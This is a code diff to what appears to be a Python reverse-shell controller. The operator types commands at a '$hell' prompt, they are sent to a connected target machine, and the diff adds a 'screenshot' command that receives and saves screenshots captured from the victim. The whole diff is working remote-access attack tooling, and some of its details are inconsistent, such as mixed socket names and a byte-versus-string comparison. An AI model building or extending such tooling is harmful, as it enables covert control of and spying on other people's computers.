@@ -20,7 +20,9 @@ def reliable_send(data):
     json_data = json.dumps(data)
     sock.send(json_data)
 
+
 def shell():
+    global count
     while True:
         command = input("$hell:%s > "% str(IP))
         target.send(command.encode("utf-8"))
@@ -42,6 +44,19 @@ def shell():
                 except Exception as err:
                     print(str(err))
                     reliable_send(str(err))
+        elif command[:10] == "screenshot":
+            try:
+                with open("screenshot%d.png" % count,"wb") as f:
+                    image = reliable_recv()
+                    image_decoded = base64.b64decode(image)
+                    if image_decoded[:4] == "[!!]":
+                        print(image_decoded)
+                    else:
+                        count += 1
+                        f.write(image_decoded)
+            except Exception as err:
+                print(str(err))
+                reliable_send("[!!] Failed To receive data")
 
         message = target.recv(1024)
         print(colored("[+] output :\n","green")+message.decode("utf-8")+"\n")
@@ -61,5 +76,6 @@ def server():
 
 
 if __name__ == "__main__":
+    count = 1
     server()
     shell()
